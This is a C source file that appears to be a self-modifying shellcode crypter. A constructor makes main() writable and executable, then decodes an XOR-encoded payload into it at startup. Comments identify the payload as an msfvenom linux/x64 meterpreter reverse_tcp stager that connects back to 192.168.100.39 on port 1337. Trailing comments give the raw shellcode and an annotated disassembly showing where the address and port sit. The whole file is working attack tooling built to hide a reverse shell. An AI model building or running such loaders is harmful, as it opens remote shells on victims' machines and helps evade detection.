#include <stdio.h>
#include <stdlib.h>

#include <errno.h>

#include <unistd.h>     /* getpagesize() */
#include <sys/mman.h>	/* mprotect() */

#include <inttypes.h>	/* uintptr_t and format macros */

#define VERBOSE_DISASM

#define ADDRSZ          0xF

#define CRYPT_SECTION 	__attribute__((noinline, section("cryptsect")))
#define CRYPT_SECTEND	__attribute__((noinline, section("cryptsectend")))

const int nop_bytes = 130;

int unlock_text_segment(unsigned char *txtsg_addr) {
	size_t pagesz = getpagesize();

	txtsg_addr -= (uintptr_t) txtsg_addr % pagesz;

	int chmem = mprotect(txtsg_addr, pagesz, PROT_READ | PROT_WRITE | PROT_EXEC);
	if (chmem != EXIT_SUCCESS) {
		fprintf(stderr, "[E%d] RWX\n", chmem);
		return chmem;
	}
    return chmem;
}

CRYPT_SECTION int main(int argc, char const *argv[]) {
    /* code */
    __asm__ volatile (".rept %c0; .byte 0xff; .endr; .byte 0xc0, 0xde" :: "i"(nop_bytes));
    return 0;
}

CRYPT_SECTEND void sectbarrier(void) { return; }

int __attribute__ ((constructor)) /*__attribute__((optimize("O0")))*/ _pentry(void) {
    /* grab main() address */
    unsigned char (*mainptr)() = main;
    uintptr_t mainaddr = (uintptr_t) mainptr;;

    /* Grab CRYPTSECTION start and end address */
    extern unsigned char cryptsect[];
    extern unsigned char cryptsectend[];

    /* convert the addresses */
    unsigned char cryptsect_startptr[ADDRSZ];
    unsigned char cryptsect_endptr[ADDRSZ];

    snprintf(cryptsect_startptr, ADDRSZ, "%p", cryptsect);
    snprintf(cryptsect_endptr, ADDRSZ, "%p", cryptsectend);

    uintptr_t cryptsect_startaddr = strtoull(cryptsect_startptr, NULL, 16);
    uintptr_t cryptsect_endaddr = strtoull(cryptsect_endptr, NULL, 16);

    if (cryptsect_startaddr == 0x0 || cryptsect_endaddr == 0x0) { 
        fprintf(stderr, "[E%d] Unable to retrieve CRYPT_SECTION address!\n", errno);
        return EXIT_FAILURE;
    }

    /* size of main() */
    size_t mainsz = cryptsect_endaddr - mainaddr;

    printf("CRYPTSECT_START: 0x%.2" PRIxPTR "\n", cryptsect_startaddr);
    printf("int main( ... ): 0x%.2" PRIxPTR "\n", (unsigned char *)mainptr);
    printf("int main() size: %zu    [ 0x%llx ]\n", mainsz, mainsz);
    printf("CRYPTSECT_END  : 0x%.2" PRIxPTR "\n", cryptsect_endaddr);

    /* Get the address of last encrypted byte */
    size_t cryptsize = 0;
    uintptr_t last_cryptbyte_addr = 0x0;
    
    unsigned char *ptr = mainptr;
    for (size_t i = 0, j = 0; i < mainsz; i++) {
        /* verify valid bytes */
        if ((unsigned char) *(ptr + i) == 0xc0 && (unsigned char) *(ptr + i + 1) == 0xde) {
            last_cryptbyte_addr = mainaddr + (++i);
            cryptsize = i;
            break;
        }
    }

    if (last_cryptbyte_addr == 0x0) {
        fprintf(stderr, "[E%d] Unable to locate cryptbytes!\n", EXIT_FAILURE);
        return EXIT_FAILURE;
    }

    printf("Last CryptByte : 0x%.2" PRIxPTR " [OFFSET: 0x%.2" PRIxPTR "]\n", last_cryptbyte_addr, (last_cryptbyte_addr - mainaddr));

    /* unlock text segment */
    if (unlock_text_segment((unsigned char *)mainptr) != 0) {
        return EXIT_FAILURE;
    }

    unsigned char *cryptstart = (unsigned char *) last_cryptbyte_addr - cryptsize;
    
    /* encoded payload => $: msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.100.39 lport=1337 -f c*/
    unsigned char encpyld[] = "\xb7\xce\x00\x95\xf6\xa7\x66\x49\xef\xb7\x76\x29\xb2\xce\x36\x95\xdd\xbe\xa5\x4d\xf8\xf0\xfa\xb7\x7a\x3f\x87\xae\x95\xf5\xbe\xa6\xaf\x95\xd6\xa7\x66\x95\xfd\xa0\x95\xfe\xa1\xf0\xfa\xb7\x7a\x3f\x87\xc4\xb7\x68\xb7\x46\xfd\xff\xfa\xc6\x3f\x57\x9b\xd8\xae\xb7\x76\x19\x95\xef\xa5\x95\xd5\xa7\xf0\xfa\xa6\xb7\x7a\x3f\x86\xda\xb6\x00\x36\x8b\xe7\xa8\x95\xdc\xa7\x95\xff\x95\xfa\xb7\x76\x18\xb7\xce\x09\xf0\xfa\xa6\xa6\xa0\xb7\x7a\x3f\x86\x38\x95\xc3\xa7\x95\xfe\xa0\xf0\xfa\xa1\x95\x81\xa5\xf0\xfa\xb7\x7a\x3f\x87\x12\x00\x19";
    
    /* Now rewrite main() */
    for (size_t i = 0; i < cryptsize + 1; i++) {
        printf("[%p] 0x%2x\n", cryptstart, *cryptstart);
        if (*cryptstart != 0xff && *cryptstart != 0xc0 && *cryptstart != 0xde) {
            printf("[%zu] Bad crypt byte (0x%2x)\n", i, *cryptstart);
            break;
        }

        /*
          * A "more portable" way of building the shellcode could be done by manually replacing the hex bytes which represent the IP address and port number
          * Using `unsigned char ipaddr[] = { 192, 168, 100, 39 };` and `unsigned char *port = 1337;`, we can rewrite the hex values, starting at 57th byte.
          * See the shellcode disassembly (LINE 327) to get a better idea of what's happening. 
        */

        *cryptstart = (unsigned char) (0xff - encpyld[i]);
        cryptstart++;
    }

#ifdef VERBOSE_DISASM
    /* reset position */
    cryptstart = (unsigned char *) last_cryptbyte_addr - cryptsize;
    
    /* print main disassembly */
    printf("Disassembly of main():\n");
    for (size_t i = 0; i < mainsz; i++) {
        printf("[%p] (%zu) 0x%.2" PRIxPTR "\n", cryptstart, i, *cryptstart);
        cryptstart++;
    }

    putchar('\n');
#endif

    printf("[+] Jumping to main() ..\n");

    return 0;
}

/*

Disassembly of main():

Disassembly of section cryptsect:

00000000000014c0 <main>:
    14c0:       ff                      (bad)
    14c1:       ff                      (bad)
    14c2:       ff                      (bad)
    14c3:       ff                      (bad)
    14c4:       ff                      (bad)
    14c5:       ff                      (bad)
    14c6:       ff                      (bad)
    14c7:       ff                      (bad)
    14c8:       ff                      (bad)
    14c9:       ff                      (bad)
    14ca:       ff                      (bad)
    14cb:       ff                      (bad)
    14cc:       ff                      (bad)
    14cd:       ff                      (bad)
    14ce:       ff                      (bad)
    14cf:       ff                      (bad)
    14d0:       ff                      (bad)
    14d1:       ff                      (bad)
    14d2:       ff                      (bad)
    14d3:       ff                      (bad)
    14d4:       ff                      (bad)
    14d5:       ff                      (bad)
    14d6:       ff                      (bad)
    14d7:       ff                      (bad)
    14d8:       ff                      (bad)
    14d9:       ff                      (bad)
    14da:       ff                      (bad)
    14db:       ff                      (bad)
    14dc:       ff                      (bad)
    14dd:       ff                      (bad)
    14de:       ff                      (bad)
    14df:       ff                      (bad)
    14e0:       ff                      (bad)
    14e1:       ff                      (bad)
    14e2:       ff                      (bad)
    14e3:       ff                      (bad)
    14e4:       ff                      (bad)
    14e5:       ff                      (bad)
    14e6:       ff                      (bad)
    14e7:       ff                      (bad)
    14e8:       ff                      (bad)
    14e9:       ff                      (bad)
    14ea:       ff                      (bad)
    14eb:       ff                      (bad)
    14ec:       ff                      (bad)
    14ed:       ff                      (bad)
    14ee:       ff                      (bad)
    14ef:       ff                      (bad)
    14f0:       ff                      (bad)
    14f1:       ff                      (bad)
    14f2:       ff                      (bad)
    14f3:       ff                      (bad)
    14f4:       ff                      (bad)
    14f5:       ff                      (bad)
    14f6:       ff                      (bad)
    14f7:       ff                      (bad)
    14f8:       ff                      (bad)
    14f9:       ff                      (bad)
    14fa:       ff                      (bad)
    14fb:       ff                      (bad)
    14fc:       ff                      (bad)
    14fd:       ff                      (bad)
    14fe:       ff                      (bad)
    14ff:       ff                      (bad)
    1500:       ff                      (bad)
    1501:       ff                      (bad)
    1502:       ff                      (bad)
    1503:       ff                      (bad)
    1504:       ff                      (bad)
    1505:       ff                      (bad)
    1506:       ff                      (bad)
    1507:       ff                      (bad)
    1508:       ff                      (bad)
    1509:       ff                      (bad)
    150a:       ff                      (bad)
    150b:       ff                      (bad)
    150c:       ff                      (bad)
    150d:       ff                      (bad)
    150e:       ff                      (bad)
    150f:       ff                      (bad)
    1510:       ff                      (bad)
    1511:       ff                      (bad)
    1512:       ff                      (bad)
    1513:       ff                      (bad)
    1514:       ff                      (bad)
    1515:       ff                      (bad)
    1516:       ff                      (bad)
    1517:       ff                      (bad)
    1518:       ff                      (bad)
    1519:       ff                      (bad)
    151a:       ff                      (bad)
    151b:       ff                      (bad)
    151c:       ff                      (bad)
    151d:       ff                      (bad)
    151e:       ff                      (bad)
    151f:       ff                      (bad)
    1520:       ff                      (bad)
    1521:       ff                      (bad)
    1522:       ff                      (bad)
    1523:       ff                      (bad)
    1524:       ff                      (bad)
    1525:       ff                      (bad)
    1526:       ff                      (bad)
    1527:       ff                      (bad)
    1528:       ff                      (bad)
    1529:       ff                      (bad)
    152a:       ff                      (bad)
    152b:       ff                      (bad)
    152c:       ff                      (bad)
    152d:       ff                      (bad)
    152e:       ff                      (bad)
    152f:       ff                      (bad)
    1530:       ff                      (bad)
    1531:       ff                      (bad)
    1532:       ff                      (bad)
    1533:       ff                      (bad)
    1534:       ff                      (bad)
    1535:       ff                      (bad)
    1536:       ff                      (bad)
    1537:       ff                      (bad)
    1538:       ff                      (bad)
    1539:       ff                      (bad)
    153a:       ff                      (bad)
    153b:       ff                      (bad)
    153c:       ff                      (bad)
    153d:       ff                      (bad)
    153e:       ff                      (bad)
    153f:       ff                      (bad)
    1540:       ff                      (bad)
    1541:       ff c0                   inc    eax
    1543:       de 31                   fidiv  WORD PTR [rcx]
    1545:       c0                      .byte 0xc0
    1546:       c3                      ret

*/

/*
Payload assembly    
    
    $: msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.100.39 lport=1337 -f c

    unsigned char payload[] =
        "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
        "\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
        "\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
        "\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8"
        "\x64\x27\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
        "\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
        "\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
        "\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
        "\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

   4:   48 31 ff                xor    rdi,rdi
   7:   6a 09                   push   0x9
   9:   58                      pop    rax
   a:   99                      cdq
   b:   b6 10                   mov    dh,0x10
   d:   48 89 d6                mov    rsi,rdx
  10:   4d 31 c9                xor    r9,r9
  13:   6a 22                   push   0x22
  15:   41 5a                   pop    r10
  17:   b2 07                   mov    dl,0x7
  19:   0f 05                   syscall
  1b:   48 85 c0                test   rax,rax
  1e:   78 51                   js     71 <f+0x71>
  20:   6a 0a                   push   0xa
  22:   41 59                   pop    r9
  24:   50                      push   rax
  25:   6a 29                   push   0x29
  27:   58                      pop    rax
  28:   99                      cdq
  29:   6a 02                   push   0x2
  2b:   5f                      pop    rdi
  2c:   6a 01                   push   0x1
  2e:   5e                      pop    rsi
  2f:   0f 05                   syscall
  31:   48 85 c0                test   rax,rax
  34:   78 3b                   js     71 <f+0x71>
  36:   48 97                   xchg   rdi,rax
  38:   48 b9 02 00 05 39 c0    movabs rcx,0x2764a8c039050002   ; 0xc0 0xa8 0x64 0x27 = 192.168.100.39 //  0x0539 = 1337
  3f:   a8 64 27
  42:   51                      push   rcx
  43:   48 89 e6                mov    rsi,rsp
  46:   6a 10                   push   0x10
  48:   5a                      pop    rdx
  49:   6a 2a                   push   0x2a
  4b:   58                      pop    rax
  4c:   0f 05                   syscall
  4e:   59                      pop    rcx
  4f:   48 85 c0                test   rax,rax
  52:   79 25                   jns    79 <f+0x79>
  54:   49 ff c9                dec    r9
  57:   74 18                   je     71 <f+0x71>
  59:   57                      push   rdi
  5a:   6a 23                   push   0x23
  5c:   58                      pop    rax
  5d:   6a 00                   push   0x0
  5f:   6a 05                   push   0x5
  61:   48 89 e7                mov    rdi,rsp
  64:   48 31 f6                xor    rsi,rsi
  67:   0f 05                   syscall
  69:   59                      pop    rcx
  6a:   59                      pop    rcx
  6b:   5f                      pop    rdi
  6c:   48 85 c0                test   rax,rax
  6f:   79 c7                   jns    38 <f+0x38>
  71:   6a 3c                   push   0x3c
  73:   58                      pop    rax
  74:   6a 01                   push   0x1
  76:   5f                      pop    rdi
  77:   0f 05                   syscall
  79:   5e                      pop    rsi
  7a:   6a 7e                   push   0x7e
  7c:   5a                      pop    rdx
  7d:   0f 05                   syscall
  7f:   48 85 c0                test   rax,rax
  82:   78 ed                   js     71 <f+0x71>
  84:   ff e6                   jmp    rsi

*/
